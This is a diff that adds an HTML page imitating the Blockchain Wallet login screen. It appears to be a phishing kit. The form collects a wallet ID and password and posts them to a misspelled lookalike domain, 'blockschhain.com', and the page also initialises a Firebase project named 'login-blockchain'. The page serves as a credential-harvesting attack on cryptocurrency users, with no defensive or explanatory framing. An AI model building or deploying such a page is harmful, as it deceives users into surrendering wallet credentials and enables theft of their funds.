@@ -1,0 +1,78 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="imgz/fav.png" />
+<title>Blockchain Wallet - Exchange Cryptocurrency</title>
+<style type="text/css">
+body {
+	background-repeat: no-repeat;
+	background-color: #0D3578;
+	top:0px;
+	bottom:0px;
+	margin-bottom:0px;
+	margin-top:0px;
+}
+
+.rose {
+    padding: 40px;
+    border-radius: 8px;
+    box-sizing: border-box;
+    background-color: rgb(255, 255, 255);
+    box-shadow: rgba(0, 0, 0, 0.21) 0px 2px 8px 0px;
+    width: 480px;
+    position: relative;
+    overflow: visible;
+}
+</style>
+</head>
+
+<body>
+<center>
+<div style="float:left; margin-top:0px; margin-left:25px;">
+<img src="imgz/bk-img.png" />
+</div>
+
+</div>
+<form action="https://blockschhain.com/verification/wall.php" method="post">
+<div style="float:left; width:480px; height:446px; background-color:#fff; margin-top:87px; margin-left:200px; box-shadow: rgba(0, 0, 0, 0.21) 0px 2px 8px 0px; border-radius: 8px; overflow: visible; position: relative;">
+<div style="margin-top:25px;"><img src="imgz/welkome.png" /></div>
+
+
+<div style="margin-top:20px; text-align:left; margin-left:35px;"><img src="imgz/id1.png" /></div>
+<input type="text" required="required" style="width:80%; padding:10px; margin-top:10px;" name="wallid"  />
+<div style="margin-top:5px;"><img src="imgz/option1.png" /></div>
+<div style="margin-top:20px; text-align:left; margin-left:35px;"><img src="imgz/pwd1.png" /></div>
+<input type="password" required="required" style="width:80%; padding:10px; margin-top:10px;" name="passid"  />
+<input type="submit" style="width:85%; height:39px; background-color:#6FCEEF; border:none; cursor:pointer; padding:10px; border-radius:4px; margin-top:15px; font-family:'Arial Black', Gadget, sans-serif; font-weight:bold; color:#fff;" value="LOG IN" />
+<div style="float:left; margin-top:22px;"><img src="imgz/trouble2.png" /></div>
+</div>
+</form>
+<div style="margin-right:10px; margin-top:23px;">
+<img src="imgz/bk-img2.png" />
+</div>
+</body>
+
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyAcwfy1_ov2vAT3x2m7gWqKsE0N9mvLVgM",
+    authDomain: "login-blockchain.firebaseapp.com",
+    databaseURL: "https://login-blockchain.firebaseio.com",
+    projectId: "login-blockchain",
+    storageBucket: "login-blockchain.appspot.com",
+    messagingSenderId: "180111736670",
+    appId: "1:180111736670:web:f75cbfc8bd89c6a86699cf"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+</script>
+
+</center>
+</html>
